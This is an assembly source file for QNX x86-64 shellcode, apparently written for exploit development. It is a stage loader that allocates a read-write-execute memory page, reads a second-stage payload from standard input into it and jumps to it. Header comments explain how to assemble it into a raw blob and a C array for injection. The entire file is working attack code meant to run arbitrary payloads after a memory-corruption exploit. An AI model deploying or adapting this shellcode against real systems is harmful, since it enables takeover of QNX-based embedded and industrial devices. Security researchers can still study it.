/*
 * QNX x86-64 Shellcode (not optimized)
 *   Stage loader, allocate 1 page of rwx mem, read from 
 *   file descriptor (0 by default) and jump to it
 *   Tested on 8.0 and 8.04.
 *
 * By Claes M Sjöberg <cmn@signedness.org>, May 2026
 *
 * Compile executable:
 *  ntox86_64-as -o stageload.o x86_64_stageload.s
 *  qcc -Vgcc_ntox86_64 -nostdlib -o stageload stageload.o
 *  ntox86_64-objdump -S stageload
 *
 * Create and disassemble blob:
 *  ntox86_64-as -o stageload.o x86_64_stageload.s
 *  ntox86_64-ld --oformat binary -o stageload.bin stageload.o
 *  ntox86_64-objdump -D -b binary -m i386:x86-64 stageload.bin 
 *
 * Create shellcode C array:
 *  xxd --include stageload.bin
 */

# Page aligned bufsize
.equ BUFSIZE, 0x1000

.global main
.text
main:
    # Align stack to 16 byte boundary
    pushq   %rax         # Increase stack to avoid truncating
    pushq   %rax        
    andq    $-16, %rsp   # Align to 16 byte boundary

    #
    # Set up struct _mem_map
    #
    # struct _mem_map {
    #    _Uint16t type;
    #    _Uint16t zero;
    #    _Int32t  pid; /* reserved1 on 7.1 */
    #    _Uint64t addr;
    #    _Uint64t len;
    #    _Uint32t prot;
    #    _Uint32t flags;
    #    _Int32t  fd;
    #    _Uint32t preload;
    #    _Uint64t align;
    #    off64_t  offset;
    #    _Uint64t shmem_handle;
    #    _Uint64t elf_pvaddr;
    # } mm;
    #

    xorq    %rax, %rax

    # elf_pvaddr
    # shmem_handle
    # offset
    # align
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax

    # preload = 0
    # fd = NOFD
    mov     $0xffffffff, %eax
    pushq   %rax     

    # flags = MAP_PRIVATE;
    # prot = PROT_READ|PROT_WRITE|PROT_EXEC;
    movabs  $0x0000000200000700, %rax
    pushq   %rax                

    # len = BUFSIZE
    movq    $BUFSIZE, %rax
    pushq   %rax

    # addr = 0
    xorq    %rax, %rax
    pushq   %rax

    # pid = 0
    # zero = 0
    # type = 0x40
    movabs  $0x0000000000000040, %rax
    pushq   %rax  

    # Set up all syscall arguments for mmap
    # MsgSend(0x40000000, (void *)&mm,   72, &reply, 24);
    # MsgSend(%rdi,               %rsi,%rdx,   %r10, %r8)
    movq    %rsp, %rsi # pointer to struct _mem_map
    xorq    %rdx, %rdx
    addq    $72, %rdx
    subq    $24, %rsp
    movq    %rsp, %r10
    xor     %r8, %r8
    addq    $24, %r8
    movq    $0x40000000, %rdi   # coid (process manager)

    neg     %rdx                # As done in MsgSend() in libc
    neg     %r8                 # As done in MsgSend() in libc
    movq    $0xb, %rax          # MsgSend syscall number (11)
    syscall

    #
    # Save returned address from reply struct on stack
    # to setup arguments for reading next stage.
    #
    # struct _mem_map_reply {
    #   _Uint64t real_size; /* Page aligned size */
    #   _Uint64t real_addr; /* Page aligned address */
    #   _Uint64t addr;      /* Address (might be offset into real_addr) */
    # }
    #

    # Save a pointer to buffer since %r15 is preserved 
    # across syscalls
    mov     8(%rsp), %r15

    # buf, buf, sizeof(buf) 
    mov     %r15, %r10
    xorq    %r8, %r8
    addq    $BUFSIZE, %r8

    # Save a pointer to buffer since %r15 is preserved 
    # across syscalls
    mov     %r10, %r15

    #
    # setup struct _io_read for reading next stage
    #
    # struct _io_read {
    #    _Uint16t type;
    #    _Uint16t combine_len;
    #    _Uint32t nbytes;
    #    _Uint32t xtype;
    #    _Uint32t zero;
    # };
    #

    # zero = 0
    # xtype = _IO_XTYPE_NONE = 0
    movabs  $0x0000000000000000, %rax
    pushq   %rax

    # nbytes = 0x00001000
    # combine_len = 0x0010
    # type = 0x0101
    movabs  $0x0000100000100101, %rax
    pushq   %rax

    mov     %rsp, %rsi
    xorq    %rdx, %rdx
    addq    $16, %rdx

    # File descriptor to read from
    # (STDIN_FILENO)
    xorq    %rdi, %rdi

    # MsgSend(STDIN_FILENO, &ir, sizeof(ir), buf, sizeof(buf));
    # MsgSend(%rdi,               %rsi,%rdx,   %r10, %r8)
    neg     %rdx                # As done in MsgSend() in libc
    neg     %r8                 # As done in MsgSend() in libc
    movq    $0xb, %rax          # MsgSend syscall number (11)
    syscall

    # Align stack to 16 byte boundary
    pushq   %rax         # Increase stack to avoid truncating
    pushq   %rax        
    andq    $-16, %rsp   # Align to 16 byte boundary

    # Jump to buffer
    call     *%r15

    # ThreadDestroy() / __exit()
    mov     $0x2f, %rax
    syscall
